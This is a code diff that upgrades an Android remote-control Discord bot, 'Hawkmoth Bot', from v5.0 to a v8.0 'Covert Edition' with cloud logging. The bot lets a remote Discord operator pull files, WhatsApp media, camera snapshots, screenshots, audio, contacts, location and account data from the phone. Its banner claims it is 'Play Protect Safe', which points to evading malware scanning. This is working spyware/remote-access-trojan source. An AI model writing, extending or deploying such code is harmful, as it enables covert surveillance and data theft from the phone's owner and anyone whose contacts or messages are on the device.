@@ -1,19 +1,28 @@
 """
 ╔══════════════════════════════════════════════════════════════════╗
-║           Hawkmoth Bot v5.0 — النسخة الشاملة النهائية           ║
+║           Hawkmoth Bot v8.0 — Cloud-Integrated Edition          ║
 ║                                                                  ║
-║  الميزات:                                                        ║
-║    • 75+ أمرًا منظّمة في 12 فئة                                  ║
-║    • ✅ لا يوجد توكن مدمج — يستقبل من Java                       ║
-║    • ✅ Decorator System للفحص الموحّد                            ║
-║    • ✅ AndroidVersion Detection                                 ║
-║    • ✅ Unified Error Handling                                   ║
-║    • ✅ FileBrowser v2.0 مع Natural Sort + Search + Filters      ║
-║    • ✅ AudioRecorder v4.0 (Pause/Resume/History/Stats)         ║
-║    • ✅ AccountsHelper v3.0 (Categories + Stats + Grouped)      ║
-║    • ✅ واجهة /start مع شعار Hawkmoth المزخرف                     ║
-║    • ✅ دعم كامل API 23 → 34+                                   ║
-║    • ✅ Play Protect Safe                                       ║
+║  Improvements in v8.0:                                           ║
+║    ✅ Cloud Integration (cloud_agent)                            ║
+║    ✅ Bot Factory Pattern (rebuildable)                          ║
+║    ✅ Session Guard (is_my_session_active)                       ║
+║    ✅ @with_cloud_audit decorator                                ║
+║    ✅ Beautiful Embed UI + Interactive Menu                      ║
+║    ✅ Category Submenus (12 categories)                          ║
+║    ✅ Color Themes per Category                                  ║
+║    ✅ Progress Indicators (live updates)                         ║
+║    ✅ Unified Error Handling                                     ║
+║    ✅ Enhanced Diagnostics                                       ║
+║                                                                  ║
+║  Preserved from v5.0:                                            ║
+║    ✅ 75+ Commands in 12 categories                              ║
+║    ✅ Decorator System                                           ║
+║    ✅ AndroidVersion Detection                                   ║
+║    ✅ FileBrowser v2.0 (advanced)                                ║
+║    ✅ AudioRecorder v4.0                                         ║
+║    ✅ AccountsHelper v3.0                                        ║
+║    ✅ API 23 → 34+ Support                                       ║
+║    ✅ Play Protect Safe                                          ║
 ╚══════════════════════════════════════════════════════════════════╝
 """
 
@@ -31,7 +40,7 @@ import platform
 import threading
 import traceback
 import functools
-from typing import Optional, Dict, Any, List
+from typing import Optional, Dict, Any, List, Callable, Tuple
 from collections import defaultdict
 
 import discord
@@ -42,9 +51,42 @@ from discord import app_commands
 # ═══════════════════════════════════════════════════════════════════
 #                       VERSION
 # ═══════════════════════════════════════════════════════════════════
-VERSION = "5.0.0"
-VERSION_NAME = "Moayed Edition"
+VERSION = "8.0.0"
+VERSION_NAME = "Covert Edition"
 BOT_TITLE = "JvRemotPy"
+DEFAULT_PREFIX = "!"
+DISCORD_LIMIT_MB = 24.0
+FILES_PER_PAGE = 20
+RATE_LIMIT_PER_MIN = 20
+CACHE_TTL_SEC = 30
+
+
+def get_version() -> str:
+    return VERSION
+
+
+# ═══════════════════════════════════════════════════════════════════
+#                       Colors
+# ═══════════════════════════════════════════════════════════════════
+class Colors:
+    PRIMARY = 0x6C8CFF
+    SUCCESS = 0x4ADE80
+    ERROR = 0xFF6B7A
+    WARNING = 0xFBBF24
+    INFO = 0x60A5FA
+
+    FILES = 0x8B5CF6
+    MEDIA = 0xEC4899
+    DEVICE = 0x06B6D4
+    PHONE = 0x10B981
+    LOCATION = 0xEF4444
+    AUDIO = 0xF59E0B
+    CONTACTS = 0xA855F7
+    SYSTEM = 0x64748B
+    APPS = 0x3B82F6
+    SENSORS = 0xF43F5E
+    ACCOUNTS = 0x8B5CF6
+    CLOUD = 0x7C3AED
 
 
 # ═══════════════════════════════════════════════════════════════════
@@ -60,7 +102,7 @@ log.info(f"🔧 hawkmoth_bot.py v{VERSION} ({VERSION_NAME}) loading...")
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       استيراد bridge بأمان
+#                       Bridge
 # ═══════════════════════════════════════════════════════════════════
 _bridge = None
 _BRIDGE_AVAILABLE = False
@@ -73,7 +115,20 @@ except ImportError as _e:
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       استيراد file_browser المتقدم
+#                       Cloud Agent
+# ═══════════════════════════════════════════════════════════════════
+_cloud = None
+_CLOUD_AVAILABLE = False
+try:
+    import cloud_agent as _cloud
+    _CLOUD_AVAILABLE = True
+    log.info("✅ cloud_agent.py loaded")
+except ImportError as _e:
+    log.warning(f"⚠️ cloud_agent.py not available: {_e}")
+
+
+# ═══════════════════════════════════════════════════════════════════
+#                       File Browser
 # ═══════════════════════════════════════════════════════════════════
 _ADVANCED_BROWSER = False
 try:
@@ -85,25 +140,11 @@ try:
     _ADVANCED_BROWSER = True
     log.info("✅ file_browser.py loaded (advanced)")
 except ImportError as _e:
-    log.warning(f"⚠️ file_browser.py not available — using fallback: {_e}")
+    log.warning(f"⚠️ file_browser.py not available: {_e}")
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       الإعدادات الثابتة
-# ═══════════════════════════════════════════════════════════════════
-DEFAULT_PREFIX = "!"
-DISCORD_LIMIT_MB = 24.0
-FILES_PER_PAGE = 20
-RATE_LIMIT_PER_MIN = 20
-CACHE_TTL_SEC = 30
-
-
-def get_version() -> str:
-    return VERSION
-
-
-# ═══════════════════════════════════════════════════════════════════
-#                       BotState (thread-safe)
+#                       BotState (v8.0 — Cloud-aware)
 # ═══════════════════════════════════════════════════════════════════
 class BotState:
     def __init__(self):
@@ -113,11 +154,14 @@ class BotState:
         self.owner_id: Optional[int] = None
         self.guild_id: Optional[int] = None
         self.allowed_user_id: Optional[int] = None
+        self.device_id: str = ""              # 🆕
+        self.context: Any = None              # 🆕
         self.is_running: bool = False
         self.start_time: Optional[float] = None
         self.last_error: Optional[str] = None
         self.stop_event = threading.Event()
         self.loop: Any = None
+        self.cloud_reported: bool = False     # 🆕
 
     def reset(self):
         with self._lock:
@@ -125,6 +169,7 @@ class BotState:
             self.start_time = None
             self.stop_event = threading.Event()
             self.loop = None
+            self.cloud_reported = False
 
     def mark_running(self):
         with self._lock:
@@ -178,6 +223,10 @@ class Stats:
 
     def uptime(self):
         return time.time() - self.started_at
+
+    def reset_uptime(self):
+        with self._lock:
+            self.started_at = time.time()
 
     def to_dict(self):
         with self._lock:
@@ -280,11 +329,9 @@ LIST_CACHE = TTLCache(ttl_sec=CACHE_TTL_SEC, max_size=200)
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       AndroidVersion Detection
+#                       AndroidVersion
 # ═══════════════════════════════════════════════════════════════════
 class AndroidVersion:
-    """كشف إصدار Android والميزات المتاحة."""
-
     def __init__(self):
         self.sdk: int = 0
         self.release: str = "?"
@@ -308,14 +355,13 @@ class AndroidVersion:
         except Exception as e:
             log.warning(f"AndroidVersion.load: {e}")
 
-    # ─── خصائص الإصدار ───
     @property
     def can_pause_audio(self) -> bool:
-        return self.sdk >= 24  # Android 7
+        return self.sdk >= 24
 
     @property
     def can_use_media_perms(self) -> bool:
-        return self.sdk >= 33  # Android 13
+        return self.sdk >= 33
 
     @property
     def needs_legacy_storage(self) -> bool:
@@ -348,7 +394,7 @@ ANDROID = AndroidVersion()
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       اكتشاف جذور التخزين
+#                       Storage Roots
 # ═══════════════════════════════════════════════════════════════════
 def _discover_storage_roots():
     roots = []
@@ -418,7 +464,7 @@ SCREENSHOT_DIR = _safe_makedirs(
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       ميزات البوت
+#                       Optional Features
 # ═══════════════════════════════════════════════════════════════════
 HAS_PIL = False
 try:
@@ -458,7 +504,7 @@ FAVORITES = []
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       دوال مساعدة عامة
+#                       Utility Functions
 # ═══════════════════════════════════════════════════════════════════
 def short_key(path):
     with _path_lock:
@@ -582,33 +628,81 @@ async def _compress_image(src_path):
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       Bot Init
+#                       Bot Factory Pattern
 # ═══════════════════════════════════════════════════════════════════
-intents = discord.Intents.default()
-intents.messages = True
-intents.message_content = True
-intents.guilds = True
+_event_handlers: Dict[str, Callable] = {}
+_command_registry: List[Tuple] = []
 
-bot = commands.Bot(
-    command_prefix=DEFAULT_PREFIX,
-    intents=intents,
-    help_command=None,
-    case_insensitive=True,
-    strip_after_prefix=True,
-)
+
+def bot_event(name: str):
+    """Decorator: records event handler for re-registration."""
+    def decorator(func):
+        _event_handlers[name] = func
+        return func
+    return decorator
+
+
+def bot_command(name: str, description: str, **kwargs):
+    """Decorator: records command for re-registration."""
+    def decorator(func):
+        _command_registry.append((name, description, kwargs, func))
+        return func
+    return decorator
+
+
+def _create_bot() -> commands.Bot:
+    """إنشاء بوت جديد مع تسجيل كل الأوامر والمعالجات."""
+    intents = discord.Intents.default()
+    intents.messages = True
+    intents.message_content = True
+    intents.guilds = True
+
+    new_bot = commands.Bot(
+        command_prefix=DEFAULT_PREFIX,
+        intents=intents,
+        help_command=None,
+        case_insensitive=True,
+        strip_after_prefix=True,
+    )
+
+    # تسجيل الأوامر
+    registered = 0
+    for name, desc, kwargs, func in _command_registry:
+        try:
+            new_bot.tree.command(name=name, description=desc, **kwargs)(func)
+            registered += 1
+        except Exception as e:
+            log.warning(f"Failed to register command {name}: {e}")
+    log.info(f"✅ Registered {registered} commands")
+
+    # تسجيل الأحداث
+    for event_name, handler in _event_handlers.items():
+        try:
+            new_bot.add_listener(handler, event_name)
+        except Exception as e:
+            log.warning(f"Failed to register event {event_name}: {e}")
+
+    return new_bot
+
+
+# Bot initial (سيتم استبداله عند إعادة التشغيل)
+bot: commands.Bot = _create_bot()
 
 
 # ═══════════════════════════════════════════════════════════════════
 #                       Decorator System
 # ═══════════════════════════════════════════════════════════════════
 def require_allowed(func):
-    """فحص صلاحية المستخدم قبل تنفيذ الأمر."""
     @functools.wraps(func)
     async def wrapper(interaction: discord.Interaction, *args, **kwargs):
         if not _check(interaction):
             try:
-                await interaction.response.send_message(
-                    "غير مصرح.", ephemeral=True)
+                await _safe_reply(
+                    interaction,
+                    "🚫 غير مصرّح لك باستخدام هذا الأمر.",
+                    color=Colors.ERROR,
+                    ephemeral=True,
+                )
             except Exception:
                 pass
             return
@@ -617,22 +711,36 @@ def require_allowed(func):
 
 
 def require_bridge(func):
-    """فحص توفر bridge قبل تنفيذ الأمر."""
     @functools.wraps(func)
     async def wrapper(interaction: discord.Interaction, *args, **kwargs):
         if not _bridge_ready():
             try:
-                if interaction.response.is_done():
-                    await interaction.followup.send(
-                        "❌ **جسر Python غير متاح**\n"
-                        "تأكد من تشغيل BotService بشكل صحيح."
-                    )
-                else:
-                    await interaction.response.send_message(
-                        "❌ **جسر Python غير متاح**\n"
-                        "تأكد من تشغيل BotService بشكل صحيح.",
-                        ephemeral=True,
-                    )
+                await _safe_reply(
+                    interaction,
+                    "❌ **جسر Python غير متاح**\n"
+                    "تأكد من تشغيل BotService بشكل صحيح.",
+                    color=Colors.ERROR,
+                    ephemeral=True,
+                )
+            except Exception:
+                pass
+            return
+        return await func(interaction, *args, **kwargs)
+    return wrapper
+
+
+def require_cloud(func):
+    @functools.wraps(func)
+    async def wrapper(interaction: discord.Interaction, *args, **kwargs):
+        if not _cloud_ready():
+            try:
+                await _safe_reply(
+                    interaction,
+                    "❌ **Cloud Agent غير متاح**\n"
+                    "تأكد من تشغيل التطبيق بشكل صحيح.",
+                    color=Colors.ERROR,
+                    ephemeral=True,
+                )
             except Exception:
                 pass
             return
@@ -641,7 +749,6 @@ def require_bridge(func):
 
 
 def with_stats(name: str):
-    """تسجيل الإحصائيات تلقائيًا."""
     def deco(func):
         @functools.wraps(func)
         async def wrapper(interaction: discord.Interaction, *args, **kwargs):
@@ -653,12 +760,13 @@ def with_stats(name: str):
                 log.error(f"❌ {name}: {e}")
                 log.debug(traceback.format_exc())
                 try:
-                    if interaction.response.is_done():
-                        await interaction.followup.send(
-                            f"❌ خطأ: {str(e)[:200]}")
-                    else:
-                        await interaction.response.send_message(
-                            f"❌ خطأ: {str(e)[:200]}", ephemeral=True)
+                    await _safe_reply(
+                        interaction,
+                        f"❌ **خطأ في `{name}`**\n\n"
+                        f"```\n{str(e)[:300]}\n```",
+                        color=Colors.ERROR,
+                        ephemeral=True,
+                    )
                 except Exception:
                     pass
         return wrapper
@@ -666,21 +774,53 @@ def with_stats(name: str):
 
 
 def require_android_min(sdk_min: int):
-    """التحقق من إصدار Android الأدنى."""
     def deco(func):
         @functools.wraps(func)
         async def wrapper(interaction: discord.Interaction, *args, **kwargs):
             if ANDROID.sdk < sdk_min:
                 try:
-                    await interaction.response.send_message(
+                    await _safe_reply(
+                        interaction,
                         f"❌ **هذا الأمر يحتاج Android API {sdk_min}+**\n"
-                        f"جهازك: API `{ANDROID.sdk}`",
+                        f"جهازك: `API {ANDROID.sdk}`",
+                        color=Colors.WARNING,
                         ephemeral=True,
                     )
                 except Exception:
                     pass
                 return
             return await func(interaction, *args, **kwargs)
+        return wrapper
+    return deco
+
+
+def with_cloud_audit(action: str):
+    """🆕 v8.0: تسجيل الأمر في cloud_agent بعد التنفيذ."""
+    def deco(func):
+        @functools.wraps(func)
+        async def wrapper(interaction: discord.Interaction, *args, **kwargs):
+            start = time.time()
+            success = True
+            error = None
+            try:
+                return await func(interaction, *args, **kwargs)
+            except Exception as e:
+                success = False
+                error = str(e)[:200]
+                raise
+            finally:
+                if _cloud_ready():
+                    try:
+                        duration_ms = int((time.time() - start) * 1000)
+                        _cloud.log_command(
+                            action=action,
+                            params={},
+                            success=success,
+                            error=error,
+                            duration_ms=duration_ms,
+                        )
+                    except Exception:
+                        pass
         return wrapper
     return deco
 
@@ -697,8 +837,65 @@ def _bridge_ready() -> bool:
     return _BRIDGE_AVAILABLE and _bridge is not None
 
 
+def _cloud_ready() -> bool:
+    return _CLOUD_AVAILABLE and _cloud is not None
+
+
+async def _safe_reply(interaction, content: str = None, *,
+                       embed: discord.Embed = None,
+                       view: discord.ui.View = None,
+                       color: int = None,
+                       ephemeral: bool = False):
+    """إرسال آمن (response / followup) مع دعم embed تلقائي."""
+    try:
+        if embed is None and content is not None and color is not None:
+            embed = _make_embed("", content, color)
+
+        is_done = interaction.response.is_done()
+
+        if embed is not None:
+            if is_done:
+                await interaction.followup.send(
+                    embed=embed, view=view, ephemeral=ephemeral)
+            else:
+                await interaction.response.send_message(
+                    embed=embed, view=view, ephemeral=ephemeral)
+        else:
+            if is_done:
+                await interaction.followup.send(
+                    content, view=view, ephemeral=ephemeral)
+            else:
+                await interaction.response.send_message(
+                    content, view=view, ephemeral=ephemeral)
+    except Exception as e:
+        log.warning(f"_safe_reply: {e}")
+
+
+def _make_embed(title: str, description: str = "",
+                color: int = Colors.PRIMARY) -> discord.Embed:
+    embed = discord.Embed(
+        title=title or None,
+        description=description or None,
+        color=color,
+        timestamp=discord.utils.utcnow(),
+    )
+    embed.set_footer(text=f"{BOT_TITLE} • v{VERSION}")
+    return embed
+
+
+def _make_error_embed(msg: str) -> discord.Embed:
+    return _make_embed("❌ خطأ", msg, Colors.ERROR)
+
+
+def _make_success_embed(msg: str) -> discord.Embed:
+    return _make_embed("✅ نجاح", msg, Colors.SUCCESS)
+
+
+def _make_warning_embed(msg: str) -> discord.Embed:
+    return _make_embed("⚠️ تحذير", msg, Colors.WARNING)
+
+
 async def _safe_bridge_call(func, *args, **kwargs):
-    """استدعاء bridge بأمان مع timeout."""
     try:
         return await asyncio.to_thread(func, *args, **kwargs)
     except Exception as e:
@@ -716,11 +913,9 @@ def _is_contacts_ready() -> bool:
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       Simple FileBrowserView (Fallback)
+#                       Simple File Browser (Fallback)
 # ═══════════════════════════════════════════════════════════════════
 class SimpleFileBrowserView(discord.ui.View):
-    """نسخة مبسطة من FileBrowser — تُستخدم فقط عندما لا يتوفر file_browser.py."""
-
     def __init__(self, path, page=0, sort_by="name"):
         super().__init__(timeout=1800)
         self.path = path
@@ -745,8 +940,7 @@ class SimpleFileBrowserView(discord.ui.View):
                 except Exception:
                     s = 0
                 return (not is_dir, -s)
-            else:
-                return (not is_dir, x.lower())
+            return (not is_dir, x.lower())
         return sorted(items, key=key)
 
     def _build(self):
@@ -776,8 +970,7 @@ class SimpleFileBrowserView(discord.ui.View):
                 options.append(discord.SelectOption(
                     label=f"{icon} {name}"[:100],
                     value=f"d:{short_key(full)}",
-                    description="📁 مجلد"
-                ))
+                    description="📁 مجلد"))
             else:
                 try:
                     sz = _fmt_size(os.path.getsize(full))
@@ -786,8 +979,7 @@ class SimpleFileBrowserView(discord.ui.View):
                 options.append(discord.SelectOption(
                     label=f"{icon} {name}"[:100],
                     value=f"f:{short_key(full)}",
-                    description=f"ملف · {sz}"
-                ))
+                    description=f"ملف · {sz}"))
 
         if options:
             select = discord.ui.Select(
@@ -834,17 +1026,14 @@ class SimpleFileBrowserView(discord.ui.View):
         end = min(start + FILES_PER_PAGE, self.total)
         sort_label = {"name": "اسم", "date": "تاريخ",
                       "size": "حجم"}.get(self.sort_by, "اسم")
-        return (
-            f"📂 `{self.path}`\n"
-            f"({start+1}-{end} من {self.total}) | {sort_label} | "
-            f"🖥️ `{DEVICE_NAME}`"
-        )
+        return (f"📂 `{self.path}`\n"
+                f"({start+1}-{end} من {self.total}) | {sort_label} | "
+                f"🖥️ `{DEVICE_NAME}`")
 
     def _select_cb(self):
         async def cb(interaction: discord.Interaction):
             if not _check(interaction):
-                await interaction.response.send_message(
-                    "غير مصرح.", ephemeral=True)
+                await _safe_reply(interaction, "🚫 غير مصرّح", ephemeral=True)
                 return
             value = interaction.data.get("values", [""])[0]
             if ":" not in value:
@@ -853,8 +1042,7 @@ class SimpleFileBrowserView(discord.ui.View):
             kind, key = value.split(":", 1)
             path = resolve_key(key)
             if not path or not is_path_allowed(path):
-                await interaction.response.send_message(
-                    "مسار غير صالح.", ephemeral=True)
+                await _safe_reply(interaction, "❌ مسار غير صالح", ephemeral=True)
                 return
             if kind == "d":
                 view = SimpleFileBrowserView(path, 0, self.sort_by)
@@ -862,8 +1050,7 @@ class SimpleFileBrowserView(discord.ui.View):
                     await interaction.response.edit_message(
                         content=view.title(), view=view)
                 except Exception:
-                    await interaction.response.send_message(
-                        content=view.title(), view=view)
+                    await _safe_reply(interaction, view.title(), view=view)
             else:
                 await interaction.response.defer()
                 await _send_any_file(interaction, path)
@@ -872,42 +1059,36 @@ class SimpleFileBrowserView(discord.ui.View):
     def _nav_cb(self, path, page):
         async def cb(interaction: discord.Interaction):
             if not _check(interaction):
-                await interaction.response.send_message(
-                    "غير مصرح.", ephemeral=True)
+                await _safe_reply(interaction, "🚫 غير مصرّح", ephemeral=True)
                 return
             if not is_path_allowed(path):
-                await interaction.response.send_message(
-                    "❌ خارج النطاق.", ephemeral=True)
+                await _safe_reply(interaction, "❌ خارج النطاق", ephemeral=True)
                 return
             view = SimpleFileBrowserView(path, page, self.sort_by)
             try:
                 await interaction.response.edit_message(
                     content=view.title(), view=view)
             except Exception:
-                await interaction.response.send_message(
-                    content=view.title(), view=view)
+                await _safe_reply(interaction, view.title(), view=view)
         return cb
 
     def _sort_cb(self, mode):
         async def cb(interaction: discord.Interaction):
             if not _check(interaction):
-                await interaction.response.send_message(
-                    "غير مصرح.", ephemeral=True)
+                await _safe_reply(interaction, "🚫 غير مصرّح", ephemeral=True)
                 return
             view = SimpleFileBrowserView(self.path, 0, mode)
             try:
                 await interaction.response.edit_message(
                     content=view.title(), view=view)
             except Exception:
-                await interaction.response.send_message(
-                    content=view.title(), view=view)
+                await _safe_reply(interaction, view.title(), view=view)
         return cb
 
     def _zip_cb(self, path):
         async def cb(interaction: discord.Interaction):
             if not _check(interaction):
-                await interaction.response.send_message(
-                    "غير مصرح.", ephemeral=True)
+                await _safe_reply(interaction, "🚫 غير مصرّح", ephemeral=True)
                 return
             await interaction.response.defer()
             await _send_zip_of_dir(interaction, path)
@@ -915,22 +1096,22 @@ class SimpleFileBrowserView(discord.ui.View):
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       دوال الإرسال
+#                       Send Functions
 # ═══════════════════════════════════════════════════════════════════
 async def _send_any_file(interaction, path):
     if not is_path_allowed(path):
-        await interaction.followup.send(f"❌ خارج النطاق: `{path}`")
+        await _safe_reply(interaction, f"❌ خارج النطاق: `{path}`")
         return
     if not os.path.isfile(path):
-        await interaction.followup.send(f"الملف غير موجود: `{path}`")
+        await _safe_reply(interaction, f"الملف غير موجود: `{path}`")
         return
     try:
         size_mb = os.path.getsize(path) / (1024 * 1024)
     except Exception:
         size_mb = 0
     if size_mb > DISCORD_LIMIT_MB:
-        await interaction.followup.send(
-            f"⚠️ {size_mb:.1f}MB > {DISCORD_LIMIT_MB}MB")
+        await _safe_reply(
+            interaction, f"⚠️ {size_mb:.1f}MB > {DISCORD_LIMIT_MB}MB")
         return
     try:
         size = os.path.getsize(path)
@@ -938,15 +1119,15 @@ async def _send_any_file(interaction, path):
         STATS.record_file(size)
     except Exception as e:
         STATS.record_error("send_file")
-        await interaction.followup.send(f"خطأ: {e}")
+        await _safe_reply(interaction, f"❌ {e}")
 
 
 async def _send_zip_of_dir(interaction, path):
     if not is_path_allowed(path):
-        await interaction.followup.send(f"❌ خارج النطاق: `{path}`")
+        await _safe_reply(interaction, f"❌ خارج النطاق: `{path}`")
         return
     if not os.path.isdir(path):
-        await interaction.followup.send(f"ليس مجلدًا: `{path}`")
+        await _safe_reply(interaction, f"❌ ليس مجلدًا: `{path}`")
         return
     tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.zip')
     tmp.close()
@@ -962,8 +1143,8 @@ async def _send_zip_of_dir(interaction, path):
                         continue
         size_mb = os.path.getsize(tmp.name) / (1024 * 1024)
         if size_mb > DISCORD_LIMIT_MB:
-            await interaction.followup.send(
-                f"⚠️ الأرشيف {size_mb:.1f}MB > الحد")
+            await _safe_reply(
+                interaction, f"⚠️ الأرشيف {size_mb:.1f}MB > الحد")
             return
         fname = f"{os.path.basename(path.rstrip('/')) or 'root'}.zip"
         size = os.path.getsize(tmp.name)
@@ -972,7 +1153,7 @@ async def _send_zip_of_dir(interaction, path):
         STATS.record_file(size)
     except Exception as e:
         STATS.record_error("send_zip")
-        await interaction.followup.send(f"خطأ: {e}")
+        await _safe_reply(interaction, f"❌ {e}")
     finally:
         try:
             os.remove(tmp.name)
@@ -984,10 +1165,10 @@ async def _send_images_bulk(interaction, directory, limit=None,
                              start_index=0):
     global bulk_state
     if not is_path_allowed(directory):
-        await interaction.followup.send("❌ المسار خارج النطاق.")
+        await _safe_reply(interaction, "❌ المسار خارج النطاق.")
         return
     if not os.path.isdir(directory):
-        await interaction.followup.send(f"المجلد غير موجود: `{directory}`")
+        await _safe_reply(interaction, f"المجلد غير موجود: `{directory}`")
         return
     try:
         files = sorted(
@@ -997,12 +1178,12 @@ async def _send_images_bulk(interaction, directory, limit=None,
             key=os.path.getmtime, reverse=True
         )
     except Exception as e:
-        await interaction.followup.send(f"خطأ: {e}")
+        await _safe_reply(interaction, f"❌ {e}")
         return
     if limit:
         files = files[:limit]
     if not files:
-        await interaction.followup.send("لا توجد صور.")
+        await _safe_reply(interaction, "لا توجد صور.")
         return
 
     bulk_state['suspended'] = False
@@ -1010,7 +1191,7 @@ async def _send_images_bulk(interaction, directory, limit=None,
     bulk_state['resume_index'] = start_index
 
     await interaction.followup.send(
-        f"📤 إرسال من {start_index}/{len(files)} من `{directory}`...")
+        f"📤 إرسال من {start_index}/{len(files)}...")
     sent = 0
     for idx in range(start_index, len(files)):
         if bulk_state['suspended']:
@@ -1050,13 +1231,12 @@ async def _find_files(name_query, roots, max_results=20, max_depth=8,
     results = []
     skip_dirs = {"Android", ".thumbnails", "cache", ".cache",
                  "node_modules", ".git"}
+    pattern = None
     if use_regex:
         try:
             pattern = re.compile(name_query, re.IGNORECASE)
         except re.error:
             pattern = None
-    else:
-        pattern = None
     query = name_query.lower()
 
     for root in roots:
@@ -1106,31 +1286,28 @@ class FindResultsView(discord.ui.View):
 
     async def _cb(self, interaction: discord.Interaction):
         if not _check(interaction):
-            await interaction.response.send_message(
-                "غير مصرح.", ephemeral=True)
+            await _safe_reply(interaction, "🚫 غير مصرّح", ephemeral=True)
             return
         key = interaction.data.get("values", [""])[0]
         path = resolve_key(key)
         if not path or not os.path.isfile(path):
-            await interaction.response.send_message(
-                "ملف غير موجود.", ephemeral=True)
+            await _safe_reply(interaction, "❌ ملف غير موجود", ephemeral=True)
             return
         await interaction.response.defer()
         await _send_any_file(interaction, path)
 
 
 # ═══════════════════════════════════════════════════════════════════
-#                       Helper: open browser
+#                       Open Browser Helper
 # ═══════════════════════════════════════════════════════════════════
 async def _open_browser(interaction, path: str):
-    """يفتح FileBrowser المتقدم أو البسيط."""
     if not is_path_allowed(path):
-        await interaction.response.send_message(
-            f"❌ خارج النطاق: `{path}`", ephemeral=True)
+        await _safe_reply(interaction, f"❌ خارج النطاق: `{path}`",
+                          ephemeral=True)
         return
     if not os.path.isdir(path):
-        await interaction.response.send_message(
-            f"❌ ليس مجلدًا: `{path}`", ephemeral=True)
+        await _safe_reply(interaction, f"❌ ليس مجلدًا: `{path}`",
+                          ephemeral=True)
         return
 
     if _ADVANCED_BROWSER:
@@ -1147,7 +1324,337 @@ async def _open_browser(interaction, path: str):
             view.build_title(), view=view)
     else:
         view = SimpleFileBrowserView(path, 0)
-        await interaction.response.send_message(view.title(), view=view)
+        await _safe_reply(interaction, view.title(), view=view)
+
+
+# ═══════════════════════════════════════════════════════════════════
+#                       Interactive Main Menu
+# ═══════════════════════════════════════════════════════════════════
+class MainMenuView(discord.ui.View):
+    """القائمة الرئيسية التفاعلية — 3 صفوف × 3 أزرار + تحديث."""
+
+    def __init__(self):
+        super().__init__(timeout=600)
+
+    # ═══ Row 0: Files / Media / Device ═══
+    @discord.ui.button(label="📁 الملفات", style=discord.ButtonStyle.primary, row=0)
+    async def btn_files(self, interaction: discord.Interaction,
+                        button: discord.ui.Button):
+        await _send_category_menu(interaction, "files")
+
+    @discord.ui.button(label="📸 الوسائط", style=discord.ButtonStyle.primary, row=0)
+    async def btn_media(self, interaction: discord.Interaction,
+                        button: discord.ui.Button):
+        await _send_category_menu(interaction, "media")
+
+    @discord.ui.button(label="💻 الجهاز", style=discord.ButtonStyle.primary, row=0)
+    async def btn_device(self, interaction: discord.Interaction,
+                         button: discord.ui.Button):
+        await _send_category_menu(interaction, "device")
+
+    # ═══ Row 1: Contacts / Location / Audio ═══
+    @discord.ui.button(label="👥 الاتصالات", style=discord.ButtonStyle.success, row=1)
+    async def btn_contacts(self, interaction: discord.Interaction,
+                           button: discord.ui.Button):
+        await _send_category_menu(interaction, "contacts")
+
+    @discord.ui.button(label="📍 الموقع", style=discord.ButtonStyle.success, row=1)
+    async def btn_location(self, interaction: discord.Interaction,
+                           button: discord.ui.Button):
+        await _send_category_menu(interaction, "location")
+
+    @discord.ui.button(label="🎤 الصوت", style=discord.ButtonStyle.success, row=1)
+    async def btn_audio(self, interaction: discord.Interaction,
+                        button: discord.ui.Button):
+        await _send_category_menu(interaction, "audio")
+
+    # ═══ Row 2: Apps / Sensors / Accounts ═══
+    @discord.ui.button(label="📱 التطبيقات", style=discord.ButtonStyle.danger, row=2)
+    async def btn_apps(self, interaction: discord.Interaction,
+                       button: discord.ui.Button):
+        await _send_category_menu(interaction, "apps")
+
+    @discord.ui.button(label="❤️ المستشعرات", style=discord.ButtonStyle.danger, row=2)
+    async def btn_sensors(self, interaction: discord.Interaction,
+                          button: discord.ui.Button):
+        await _send_category_menu(interaction, "sensors")
+
+    @discord.ui.button(label="🔑 الحسابات", style=discord.ButtonStyle.danger, row=2)
+    async def btn_accounts(self, interaction: discord.Interaction,
+                           button: discord.ui.Button):
+        await _send_category_menu(interaction, "accounts")
+
+    # ═══ Row 3: Cloud / Refresh ═══
+    @discord.ui.button(label="☁️ السحابة", style=discord.ButtonStyle.secondary, row=3)
+    async def btn_cloud(self, interaction: discord.Interaction,
+                        button: discord.ui.Button):
+        await _send_category_menu(interaction, "cloud")
+
+    @discord.ui.button(label="🔄 تحديث", style=discord.ButtonStyle.secondary, row=3)
+    async def btn_refresh(self, interaction: discord.Interaction,
+                          button: discord.ui.Button):
+        try:
+            embed = await _build_start_embed()
+            await interaction.response.edit_message(embed=embed)
+        except Exception:
+            await interaction.response.defer()
+
+
+# ═══════════════════════════════════════════════════════════════════
+#                       Category Menus
+# ═══════════════════════════════════════════════════════════════════
+_CATEGORY_DATA = {
+    "files": {
+        "title": "📁 الملفات",
+        "color": Colors.FILES,
+        "commands": [
+            ("`/browse`", "تصفح حر"),
+            ("`/storage`", "التخزين الرئيسي"),
+            ("`/tree`", "شجرة مجلد"),
+            ("`/search`", "بحث متقدم"),
+            ("`/find`", "بحث سريع"),
+            ("`/get`", "سحب ملف"),
+            ("`/zip`", "ضغط مجلد"),
+            ("`/latest`", "آخر الصور"),
+            ("`/favorites`", "المفضلة"),
+            ("`/roots`", "جذور التخزين"),
+            ("`/save`", "حفظ في المفضلة"),
+            ("`/upload`", "معلومات الرفع"),
+        ],
+    },
+    "media": {
+        "title": "📸 الوسائط",
+        "color": Colors.MEDIA,
+        "commands": [
+            ("`/camera`", "مجلد الكاميرا"),
+            ("`/screenshots`", "اللقطات"),
+            ("`/downloads`", "التنزيلات"),
+            ("`/documents`", "المستندات"),
+            ("`/whatsapp_media`", "وسائط واتساب"),
+            ("`/snap_back`", "صورة خلفية"),
+            ("`/snap_front`", "صورة أمامية"),
+            ("`/screenshot`", "لقطة شاشة"),
+            ("`/camera_app`", "افتح الكاميرا"),
+            ("`/pull_camera`", "سحب آخر صور"),
+            ("`/pull_screens`", "سحب آخر لقطات"),
+        ],
+    },
+    "device": {
+        "title": "💻 الجهاز",
+        "color": Colors.DEVICE,
+        "commands": [
+            ("`/sysinfo`", "معلومات النظام"),
+            ("`/health`", "فحص الصحة"),
